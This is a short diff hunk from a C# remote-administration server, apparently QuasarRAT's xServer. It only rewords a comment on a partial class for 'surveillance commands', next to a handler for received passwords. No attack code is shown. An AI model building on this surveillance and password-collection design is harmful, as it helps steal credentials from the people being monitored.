@@ -11,7 +11,7 @@ using xServer.Core.Utilities;
 
 namespace xServer.Core.Commands
 {
-    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT ARE USED FOR SURVEILLANCE. */
+    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE SURVEILLANCE COMMANDS. */
     public static partial class CommandHandler
     {
         public static void HandleGetPasswordsResponse(Client client, GetPasswordsResponse packet)
